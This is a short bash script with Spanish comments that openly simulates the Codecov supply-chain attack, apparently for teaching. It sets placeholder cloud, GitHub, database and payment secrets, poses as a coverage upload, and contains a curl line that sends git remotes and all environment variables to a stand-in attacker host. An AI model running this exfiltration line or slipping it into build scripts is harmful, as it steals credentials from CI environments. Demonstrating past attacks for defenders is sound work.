#!/bin/bash

# VULNERABILIDAD: Simulación del script malicioso de Codecov
# Este script simula el comando que fue comprometido en el caso real de Codecov

# Variables de entorno con secretos (simulando el entorno comprometido)
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export GITHUB_TOKEN="ghp_1234567890abcdefghijklmnopqrstuvwxyz12"
export DATABASE_URL="postgresql://admin:SecretPass123@db.company.com:5432/prod"
export JWT_SECRET="super-secret-jwt-key-production"
export STRIPE_SECRET_KEY="sk_live_51234567890abcdefghijklmnopqrstuvwxyz"

# Configuración del proyecto
proj_root=$(pwd)
search_in="$proj_root"

echo "Uploading coverage data..."

# VULNERABILIDAD: Comando malicioso que exfiltra datos
# Simula el comando real usado en el ataque a Codecov
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://ATTACKERIP/upload/v2 || true

# El comando anterior envía:
# 1. Información de repositorios git remotos
# 2. Todas las variables de entorno (incluyendo secretos)
# 3. A un servidor controlado por el atacante

echo "Coverage upload completed."
